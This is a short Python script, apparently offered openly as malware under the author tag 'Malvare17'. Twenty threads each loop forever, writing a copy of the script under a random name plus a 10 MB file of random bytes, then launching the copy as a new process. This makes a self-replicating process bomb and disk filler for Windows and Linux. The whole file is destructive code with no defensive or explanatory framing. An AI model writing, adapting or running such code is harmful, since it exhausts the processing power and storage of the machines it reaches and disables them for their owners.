import sys, os, random, string, subprocess, threading

SCRIPT = sys.argv
NAME = str(SCRIPT[0])

def RANDOM_(Length):
	Letters_ = string.ascii_lowercase
	return ''.join(random.choice(Letters_) for i in range(Length))

def WIN32_():
	File_ = open(__file__).read()
	ExampleName = RANDOM_(64)

	with open(ExampleName + '.py','w') as f:
		f.write(File_)
	with open(ExampleName,'wb') as BigFile:
		BigFile.write(os.urandom(10240000))

	MyFile = '{}.py'.format(ExampleName)
	subprocess.Popen(["python", MyFile], shell = False)

def LINUX_():
	File_ = open(__file__).read()
	ExampleName = RANDOM_(64)

	with open(ExampleName + '.py','w') as f:
		f.write(File_)
	with open(ExampleName,'wb') as BigFile:
		BigFile.write(os.urandom(10240000))

	MyFile = '{}.py'.format(ExampleName)
	subprocess.Popen(["python", MyFile], shell = False)

class THREAD_(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)

	def run(self):
		if sys.platform == "win32":
			while True:
				WIN32_()

		elif sys.platform == "linux2":
			while True:
				LINUX_()


def AUTHOR_():
	print("Author: Malvare17 | https://github.com/Malvare17")
	START_()

def START_():
	Thread1 = THREAD_()
	Thread2 = THREAD_()
	Thread3 = THREAD_()
	Thread4 = THREAD_()
	Thread5 = THREAD_()
	Thread6 = THREAD_()
	Thread7 = THREAD_()
	Thread8 = THREAD_()
	Thread9 = THREAD_()
	Thread10 = THREAD_()
	Thread11 = THREAD_()
	Thread12 = THREAD_()
	Thread13 = THREAD_()
	Thread14 = THREAD_()
	Thread15 = THREAD_()
	Thread16 = THREAD_()
	Thread17 = THREAD_()
	Thread18 = THREAD_()
	Thread19 = THREAD_()
	Thread20 = THREAD_()

	Thread1.start()
	Thread2.start()
	Thread3.start()
	Thread4.start()
	Thread5.start()
	Thread6.start()
	Thread7.start()
	Thread8.start()
	Thread9.start()
	Thread10.start()
	Thread11.start()
	Thread12.start()
	Thread13.start()
	Thread14.start()
	Thread15.start()
	Thread16.start()
	Thread17.start()
	Thread18.start()
	Thread19.start()
	Thread20.start()
